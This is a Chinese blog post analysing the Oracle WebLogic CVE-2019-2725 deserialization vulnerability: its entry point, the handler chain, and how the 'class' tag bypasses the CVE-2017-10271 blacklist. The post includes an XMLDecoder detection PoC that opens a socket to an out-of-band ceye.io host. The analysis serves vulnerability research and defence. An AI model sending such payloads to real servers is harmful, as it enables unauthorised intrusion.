<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="4172019年4月17日，CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》，公告指出部分版本WebLogic中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时">
<meta property="og:type" content="article">
<meta property="og:title" content="WebLogic RCE(CVE-2019-2725)漏洞之旅">
<meta property="og:url" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/index.html">
<meta property="og:site_name" content="Badcode">
<meta property="og:description" content="4172019年4月17日，CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》，公告指出部分版本WebLogic中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/1.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/2.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/3.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/4.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/5.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/6.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/7.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/8.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/9.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/10.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/11.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/12.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/14.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/15.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/16.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/25.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/17.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/26.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/18.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/19.png">
<meta property="og:image" content="d:/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/WebLogic%20RCE(CVE-2019-2725">
<meta property="og:image" content="d:/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/WebLogic%20RCE(CVE-2019-2725">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/22-1.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/23.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/24-1.png">
<meta property="og:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/27.png">
<meta property="og:updated_time" content="2019-08-02T09:36:09.523Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="WebLogic RCE(CVE-2019-2725)漏洞之旅">
<meta name="twitter:description" content="4172019年4月17日，CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》，公告指出部分版本WebLogic中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在">
<meta name="twitter:image" content="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/"/>





  <title>WebLogic RCE(CVE-2019-2725)漏洞之旅 | Badcode</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Badcode</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2019/04/30/WebLogic-RCE-CVE-2019-2725/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Badcode">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Badcode">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">WebLogic RCE(CVE-2019-2725)漏洞之旅</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-30T17:34:50+08:00">
                2019-04-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="417"><a href="#417" class="headerlink" title="417"></a>417</h3><p>2019年4月17日，CNVD 发布<a href="http://www.cnvd.org.cn/webinfo/show/4989" target="_blank" rel="noopener">《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》</a>，公告指出部分版本WebLogic中默认包含的<code>wls9_async_response</code>包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在未授权的情况下远程执行命令。</p>
<h3 id="418"><a href="#418" class="headerlink" title="418"></a>418</h3><p>2019年4月18日，开始应急。因为这个漏洞当时属于0day，也没有补丁可以参考，只能参考公告内容一步一步来看了。首先看到公告里提到的<code>wls9_async_response.war</code>包，看下<code>web.xml</code>里的url。</p>
<p><img src="1.png" alt=""></p>
<p>看到<code>/AsyncResponseService</code>，尝试访问一下，404。之后看到<code>weblogic.xml</code>和<code>weblogic-webservices.xml</code></p>
<p><img src="2.png" alt=""></p>
<p>访问下<code>_async/AsyncResponseService</code></p>
<p><img src="3.png" alt=""></p>
<p>可以正常访问，再结合公告中的漏洞处置建议，禁止 <code>/_async/*</code> 路径的URL访问，可以大概率猜测，漏洞入口在这里。</p>
<p>在<code>weblogic-webservices.xml</code>中有一个类，<code>weblogic.wsee.async.AsyncResponseBean</code>，跟进去这个类，发现在<code>wseeclient.jar</code>里面</p>
<p><img src="4.png" alt=""></p>
<p>而后我在这个类里面的方法下断点，然后构造一个普通的SOAP消息，发送。</p>
<p><img src="5.png" alt=""></p>
<p>断点没有debug到。最后我把<code>wsee/async</code>所有类的所有方法都下了断点，重新发送消息，成功在<code>AsyncResponseHandler</code>类中的<code>handleRequest</code>拦截到了。</p>
<p><img src="6.png" alt=""></p>
<p>继续流程，<code>String var2 = (String)var1.getProperty(&quot;weblogic.wsee.addressing.RelatesTo&quot;);</code>这个步骤一直取不到值，导致流程结束。为了解决这个问题，翻了不少资料，最后找到一个类似的例子，可以使用<code>&lt;ads:RelatesTo&gt;test&lt;/ads:RelatesTo&gt;</code>为<code>weblogic.wsee.addressing.RelatesTo</code>赋值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:ads</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:Action</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">ads:Action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:RelatesTo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">ads:RelatesTo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="7.png" alt=""></p>
<p>之后流程就能够继续下去了，我一直以为漏洞的关键点在这里，因为这个<code>wsee.async</code>下面的几个类中有<code>readObject</code>方法，我一直尝试着通过<code>AsyncResponseHandler</code>跳到<code>readObject</code>方法，而后就卡在这里，后面的流程就不写了，对这个漏洞来说是错的，上面写的这些猜测和流程都是正确的。</p>
<h3 id="419"><a href="#419" class="headerlink" title="419"></a>419</h3><p>2019年4月19日，和我一起应急的师傅给我发了一张截图。</p>
<p><img src="8.png" alt=""></p>
<p>看到这截图里面的<code>RelatesTo</code>，我还以为之前的推测没有错，只是没有没有构造好。</p>
<p>全局搜索<code>UnitOfWorkChangeSet</code>这个类，之后在这个类中下断点。</p>
<p>根据截图，构造一个类似的，然后发送</p>
<p><img src="9.png" alt=""></p>
<p>在这个类中debug到了。</p>
<p><img src="10.png" alt=""></p>
<p>看到了日思夜想的<code>readObject</code>，有了反序列的点，自然要找利用链了，目前 WebLogic 下面 <code>commoncollections</code> 相关的利用链已经是无法使用了，WebLoigc 依赖的<code>common-collections</code>版本已经升级了，先找个Jdk7u21测试一下，将生成的 payload 转换成 byte，发送。</p>
<p><img src="11.png" alt=""></p>
<p>可以看到，成功地执行了命令。但是这个利用链限制太大了，基本没啥用。我想起去年应急过的一个WebLogic 反序列漏洞，CVE-2018-3191，既然jdk7u21都不受黑名单限制，想来CVE-2018-3191也是一样可以利用的。</p>
<p><img src="12.png" alt=""></p>
<p>猜测没有错误，CVE-2018-3191也是能够利用的，这个漏洞也终于有点”危害”了。和 pyn3rd 师傅讨论一下有没有其他利用链，仔细翻下黑名单，除了CVE-2018-3191，就只有新的jython利用链(CVE-2019-2645)了，由 Matthias Kaiser大佬提交的，但是目前这个还有没有公开，所以这个利用链也没法使用。</p>
<p>有了正确答案，就可以看下之前的猜测哪里出了问题。</p>
<p>回到<code>AsyncResponseHandler</code>类中的<code>handleRequest</code>，<code>handleRequest</code>的上一步，<code>HandlerIterator</code>类中的<code>handleRequest</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">handleRequest</span><span class="params">(MessageContext var1, <span class="keyword">int</span> var2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.closureEnabled = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.status = <span class="number">1</span>;</span><br><span class="line">    WlMessageContext var3 = WlMessageContext.narrow(var1);</span><br><span class="line">    <span class="keyword">if</span> (verboseHistory) &#123;</span><br><span class="line">        updateHandlerHistory(<span class="string">"...REQUEST..."</span>, var3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">this</span>.index = var2; <span class="keyword">this</span>.index &lt; <span class="keyword">this</span>.handlers.size(); ++<span class="keyword">this</span>.index) &#123;</span><br><span class="line">        Handler var4 = <span class="keyword">this</span>.handlers.get(<span class="keyword">this</span>.index);</span><br><span class="line">        <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">            Verbose.log(<span class="string">"Processing "</span> + var4.getClass().getSimpleName() + <span class="string">"...  "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (verboseHistory) &#123;</span><br><span class="line">            updateHandlerHistory(var4.getClass().getSimpleName(), var3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HandlerStats var5 = <span class="keyword">this</span>.handlers.getStats(<span class="keyword">this</span>.index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3.setProperty(<span class="string">"weblogic.wsee.handler.index"</span>, <span class="keyword">new</span> Integer(<span class="keyword">this</span>.index));</span><br><span class="line">            String var6;</span><br><span class="line">            <span class="keyword">if</span> (!var4.handleRequest(var3)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (verboseHistory) &#123;</span><br><span class="line">                    var6 = var4.getClass().getSimpleName() + <span class="string">".handleRequest=false"</span>;</span><br><span class="line">                    updateHandlerHistory(var6, var3);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (var5 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var5.reportRequestTermination();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>会遍历<code>this.handlers</code>，然后调用每个<code>handler</code>的<code>handleRequest</code>去处理用户传入的SOAP Message。</p>
<p><img src="14.png" alt=""></p>
<p>可以看到，<code>AsyncResponseHandler</code>仅仅只是21个<code>handler</code>之中的一个，而<code>weblogic.wsee.addressing.RelatesTo</code>的赋值就是在<code>ServerAddressingHandler</code>中完成的，有兴趣的可以去跟一下。这里面有一个非常重要的<code>handler</code>–<code>WorkAreaServerHandler</code>，看名字可能觉得眼熟，看到里面的<code>handleRequest</code>方法可能就不淡定了。</p>
<p><img src="15.png" alt=""></p>
<p>之后的流程就和CVE-2017-10271是一样的了，关于这个漏洞的分析可以参考廖师傅的<a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">文章</a>。</p>
<p><img src="16.png" alt=""></p>
<p>跟到这里就可以看出来了，这个<code>url</code>只是CVE-2017-10271漏洞的<strong>另外一个入口</strong>而已。这也是后期导致假poc泛滥的一个原因。整个流程大概如下：</p>
<p><img src="25.png" alt=""></p>
<p>那么问题来了，这个poc是如何绕过CVE-2017-10271的黑名单的呢？</p>
<p>首先来看一下CVE-2017-10271的补丁，会将传入的数据先调用<code>validate</code>校验，通过之后才交给<code>XMLDecoder</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> var3 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = var1.read(); var5 != -<span class="number">1</span>; var5 = var1.read()) &#123;</span><br><span class="line">                var2.write(var5);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Failed to get data from input stream"</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.validate(<span class="keyword">new</span> ByteArrayInputStream(var2.toByteArray()));</span><br><span class="line">        <span class="keyword">this</span>.xmlDecoder = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> ByteArrayInputStream(var2.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream var1)</span> </span>&#123;</span><br><span class="line">        WebLogicSAXParserFactory var2 = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParser var3 = var2.newSAXParser();</span><br><span class="line">            var3.parse(var1, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">                <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (var3.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var3.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4.getLength(); ++var5) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!<span class="string">"index"</span>.equalsIgnoreCase(var4.getQName(var5))) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + var4.getQName(var5));</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (var3.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                            String var9 = var4.getValue(<span class="string">"class"</span>);</span><br><span class="line">                            <span class="keyword">if</span> (var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String var6 = var4.getValue(<span class="string">"length"</span>);</span><br><span class="line">                            <span class="keyword">if</span> (var6 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="keyword">int</span> var7 = Integer.valueOf(var6);</span><br><span class="line">                                    <span class="keyword">if</span> (var7 &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed array length limitation"</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">this</span>.overallarraylength += var7;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">this</span>.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Exceed over all array limitation."</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NumberFormatException var8) &#123;</span><br><span class="line">                                    ;</span><br><span class="line">                                &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>object</code>，<code>new</code>，<code>method</code>这些标签都被拦截了，遇到直接抛出错误。<code>void</code>标签后面只能跟<code>index</code>，<code>array</code>标签后面可以跟<code>class</code>属性，但是类型只能是<code>byte</code>类型的。其中，过滤<code>object</code>标签是CVE-2017-3506的补丁，剩下的过滤是针对CVE-2017-10271的补丁。</p>
<p>如果仔细看了黑名单的，就不难发现，外面流传的很多poc都是假的，就是新url入口+老的payload，这样的组合是没有办法绕过这个黑名单的。</p>
<p>绕过这个黑名单的关键是<code>class</code>标签，可以从官方的<a href="https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html" target="_blank" rel="noopener">文档</a>来了解一下这个标签。</p>
<p><img src="17.png" alt=""></p>
<p><code>class</code>标签可以表示一个类的实例，也就是说可以使用<code>class</code>标签来创建任意类的实例。而<code>class</code>标签又不在WebLogic 的黑名单之内，这才是这个漏洞最根本的原因。4月26日，Oracle 发布这个漏洞的补丁，过滤了<code>class</code>标签也证实了这点。</p>
<p><img src="26.png" alt=""></p>
<p>既然漏洞的原因是绕过了CVE-2017-10271的黑名单，那么<code>wls-wsat.war</code>也是应该受影响的。</p>
<p>测试一下，没有问题。</p>
<p><img src="18.png" alt=""></p>
<p>这说明，CNVD的公告写的影响组件不全，漏洞处置建议也写的不全面，要通过访问策略控制禁止 /_async/<em> 及 /wls-wsat/</em> 路径的URL访问才行，之后我们也同步给了CNVD，CNVD发了<a href="http://www.cnvd.org.cn/webinfo/show/4999" target="_blank" rel="noopener">第二次通告</a>。</p>
<h3 id="421"><a href="#421" class="headerlink" title="421"></a>421</h3><p>2019年4月21日，准备构造出这个漏洞的检测PoC，能够使用<code>class</code>标签来创建类的实例，我首先考虑的是构造<code>java.net.Socket</code>，这也引出了一个JDK版本的坑。我测试的是jdk6，参考之前的poc，可以这么构造</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>java.net.Socket<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>aaaaabbbbbbbbbbb.wfanwb.ceye.io<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">int</span>&gt;</span>80<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ceye成功接收到请求，也说明Socket实例创建成功了。</p>
<p><img src="19.png" alt=""></p>
<p>我把上面的检测poc在 jdk 7上测试，竟然失败了，一直爆找不到<code>java.net.Socket</code>这个类错误，让我一度以为这个漏洞只能在 jdk 6 下面触发，后来仔细对比，发现是换行符的问题，也就是这样写才对。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;java&gt;&lt;class&gt;&lt;string&gt;java.net.Socket&lt;/string&gt;&lt;void&gt;&lt;string&gt;aaaaabbbbbbbbbbb.wfanwb.ceye.io&lt;/string&gt;&lt;int&gt;80&lt;/int&gt;&lt;/void&gt;&lt;/class&gt;&lt;/java&gt;</span><br></pre></td></tr></table></figure>
